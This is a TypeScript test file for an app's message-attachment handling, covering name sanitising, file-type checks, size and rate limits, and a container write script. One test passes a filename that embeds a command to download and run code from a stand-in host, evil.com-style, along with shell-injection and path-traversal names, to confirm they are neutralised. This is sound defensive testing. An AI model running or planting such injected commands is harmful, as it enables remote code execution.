import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { requirementFor } from "../access/policy";
import {
  ATTACH_SCRIPT,
  attachmentName,
  attachmentType,
  readAttachment,
  takeAttachmentSlot,
} from "./attachments";

const bytes = (...values: number[]) => new Uint8Array(values);
const text = (value: string) => new TextEncoder().encode(value);
const stream = (...chunks: Uint8Array[]) =>
  new ReadableStream<Uint8Array>({
    start(controller) {
      for (const chunk of chunks) {
        controller.enqueue(chunk);
      }
      controller.close();
    },
  });

describe("a file attached to a message", () => {
  it("keeps its own name, made safe, for the kinds of file a message carries", () => {
    expect(attachmentName("Brief client.PDF")).toBe("Brief client.pdf");
    expect(attachmentName("Devis (1).pdf")).toBe("Devis (1).pdf");
    expect(attachmentName("../../etc/notes.txt")).toBe("notes.txt");
    expect(attachmentName("C:\\Users\\moi\\Tarifs 2027.xlsx")).toBe("Tarifs 2027.xlsx");
    expect(attachmentName(".env.csv")).toBe("env.csv");
    expect(attachmentName("Présentation été.pptx")).toBe("Présentation été.pptx");
    // Nothing a shell or a block could read as its own.
    expect(attachmentName("$(curl evil.example -o x; sh x).txt")).toBe("_(curl evil.example -o x_ sh x).txt");
    expect(attachmentName("a`id`'b\"&c!<d>.md")).toBe("a_id__b__c__d_.md");
    // Images go with a message as images; anything else is not carried.
    expect(attachmentName("logo.png")).toBeNull();
    expect(attachmentName("deploy.sh")).toBeNull();
    expect(attachmentName("archive")).toBeNull();
    expect(attachmentName(".pdf")).toBeNull();
  });

  it("is cut by characters and bytes, never inside one", () => {
    expect(attachmentName(`${"x".repeat(300)}.docx`)).toBe(`${"x".repeat(100)}.docx`);
    // A letter written with two code units, across the hundredth character, stays whole or goes whole.
    expect(attachmentName(`${"x".repeat(99)}𝒜𝒜.pdf`)).toBe(`${"x".repeat(99)}𝒜.pdf`);
    // What is neither a letter nor a digit, an emoji for one, is replaced.
    expect(attachmentName("Bravo 😀.pdf")).toBe("Bravo _.pdf");
    // A lone half of one is replaced like any other character.
    expect(attachmentName("a\uD800b.pdf")).toBe("a_b.pdf");
    const long = attachmentName(`${"漢".repeat(90)}.pdf`) ?? "";
    expect(Buffer.byteLength(long)).toBeLessThanOrEqual(200);
    expect(long.endsWith(".pdf")).toBe(true);
  });

  it("is what its name says, from its first bytes", () => {
    expect(attachmentType("a.pdf", text("%PDF-1.7\n"))).toBe("application/pdf");
    // Readers find the header within the first kilobyte.
    expect(attachmentType("a.pdf", text(`${"\n".repeat(20)}%PDF-1.4`))).toBe("application/pdf");
    expect(attachmentType("a.pdf", text("<html>"))).toBeNull();
    expect(attachmentType("a.docx", bytes(0x50, 0x4b, 0x03, 0x04, 0x14))).toBe(
      "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    );
    // A Word document with a password is an OLE file.
    expect(attachmentType("a.docx", bytes(0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1))).not.toBeNull();
    expect(attachmentType("a.ods", text("PK\u0003\u0004"))).toBe(
      "application/vnd.oasis.opendocument.spreadsheet",
    );
    expect(attachmentType("a.doc", text("{\\rtf1\\ansi"))).toBe("application/msword");
    expect(attachmentType("a.doc", text("%PDF-1.7"))).toBeNull();
    expect(attachmentType("a.xls", text("<table><tr><td>1</td></tr></table>"))).toBe(
      "application/vnd.ms-excel",
    );
    // A CSV saved in an old Windows encoding, or in UTF-16 as Excel's « Unicode text », is text.
    expect(attachmentType("a.csv", bytes(0x4e, 0x6f, 0x6d, 0x3b, 0xe9, 0x0a))).toBe("text/csv");
    expect(attachmentType("a.txt", bytes(0xff, 0xfe, 0x41, 0x00, 0x42, 0x00))).toBe("text/plain");
    expect(attachmentType("a.csv", bytes(0x41, 0x00, 0x42))).toBeNull();
  });

  it("is read up to its limit, and refused past it, empty, or stalled", async () => {
    expect(Buffer.from(await readAttachment(stream(text("ab"), text("cd")), undefined, 10)).toString()).toBe(
      "abcd",
    );
    await expect(readAttachment(stream(text("abcdef")), 100, 10)).rejects.toMatchObject({ status: 413 });
    await expect(readAttachment(stream(text("abcdef"), text("ghijk")), undefined, 10)).rejects.toMatchObject({
      status: 413,
      code: "studio_attachment_too_large",
    });
    await expect(readAttachment(stream(), undefined, 10)).rejects.toMatchObject({
      status: 400,
      code: "studio_attachment_empty",
    });
    await expect(readAttachment(null, undefined, 10)).rejects.toMatchObject({
      code: "studio_attachment_empty",
    });
    const stalled = new ReadableStream<Uint8Array>({
      start(controller) {
        controller.enqueue(text("ab"));
      },
    });
    await expect(readAttachment(stalled, undefined, 10, 20)).rejects.toMatchObject({
      status: 408,
      code: "studio_attachment_timeout",
    });
  });

  it("is saved a few at a time, and fewer for one person", () => {
    const panel = {};
    const first = takeAttachmentSlot(panel, "a@example.com");
    const second = takeAttachmentSlot(panel, "a@example.com");
    expect(() => takeAttachmentSlot(panel, "a@example.com")).toThrow(
      expect.objectContaining({ status: 429, code: "studio_attachment_busy" }),
    );
    const others = [1, 2, 3, 4].map((n) => takeAttachmentSlot(panel, `p${n}@example.com`));
    expect(() => takeAttachmentSlot(panel, "z@example.com")).toThrow(
      expect.objectContaining({ status: 429 }),
    );
    first();
    first();
    expect(() => takeAttachmentSlot(panel, "z@example.com")).not.toThrow();
    second();
    for (const release of others) {
      release();
    }
  });

  it("can be sent by whoever the project is shared with, as a message can", () => {
    expect(requirementFor("POST", "/api/v1/projects/lovable/services/site/studio/attachments")).toEqual(
      requirementFor("POST", "/api/v1/projects/lovable/services/site/studio/conversations"),
    );
    expect(requirementFor("POST", "/api/v1/projects/lovable/services/site/studio/attachments")).toMatchObject(
      {
        kind: "studio",
        project: "lovable",
        service: "site",
      },
    );
  });
});

const hasPython = spawnSync("python3", ["--version"]).status === 0;

describe.skipIf(!hasPython)("the script that writes it in the agent server's container", () => {
  let dir: string;
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "opsifier-attach-"));
  });
  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  const run = (root: string, folder: string, name: string, data: Uint8Array, quota = 1024 * 1024) => {
    const outcome = spawnSync("python3", ["-c", ATTACH_SCRIPT, root, folder, name, String(quota)], {
      input: data,
      encoding: "utf8",
    });
    const line = outcome.stdout.split("\n").find((one) => one.startsWith("opsifier-studio-attach "));
    return line === undefined
      ? { stderr: outcome.stderr }
      : JSON.parse(line.slice("opsifier-studio-attach ".length));
  };

  it("writes the file as it came, in a new folder of its own under .git", () => {
    const project = join(dir, "project");
    mkdirSync(join(project, ".git"), { recursive: true });
    const pdf = Buffer.from([0x25, 0x50, 0x44, 0x46, 0x2d, 0x00, 0xff, 0x10]);

    expect(run(project, "0011223344556677", "Devis (1).pdf", pdf)).toEqual({ ok: true });
    const kept = join(project, ".git", "opsifier-attachments", "0011223344556677", "Devis (1).pdf");
    expect(readFileSync(kept).equals(pdf)).toBe(true);
    expect(statSync(kept).mode & 0o777).toBe(0o644);
    // The same folder again is refused, and what it holds is left as it was.
    expect(run(project, "0011223344556677", "Devis (1).pdf", Buffer.from("other"))).toMatchObject({
      ok: false,
      code: "write",
    });
    expect(readFileSync(kept).equals(pdf)).toBe(true);
  });

  it("refuses a folder without git, and a link in place of a folder", () => {
    expect(run(dir, "aa", "a.pdf", Buffer.from("%PDF-"))).toEqual({ ok: false, code: "no_git" });

    const linked = join(dir, "linked");
    const elsewhere = join(dir, "elsewhere");
    mkdirSync(join(linked, ".git"), { recursive: true });
    mkdirSync(elsewhere);
    symlinkSync(elsewhere, join(linked, ".git", "opsifier-attachments"));
    expect(run(linked, "bb", "a.pdf", Buffer.from("%PDF-"))).toEqual({ ok: false, code: "unsafe" });
    expect(readdirSync(elsewhere)).toEqual([]);

    const gitLink = join(dir, "git-link");
    mkdirSync(gitLink);
    symlinkSync(elsewhere, join(gitLink, ".git"));
    expect(run(gitLink, "cc", "a.pdf", Buffer.from("%PDF-"))).toEqual({ ok: false, code: "no_git" });
    expect(readdirSync(elsewhere)).toEqual([]);
  });

  it("refuses a file past the project's quota, and leaves nothing behind for it", () => {
    const project = join(dir, "project");
    mkdirSync(join(project, ".git"), { recursive: true });
    expect(run(project, "01", "a.csv", Buffer.alloc(600, 0x61), 1000)).toEqual({ ok: true });
    expect(run(project, "02", "b.csv", Buffer.alloc(600, 0x61), 1000)).toEqual({ ok: false, code: "full" });
    expect(readdirSync(join(project, ".git", "opsifier-attachments"))).toEqual(["01"]);
  });
});
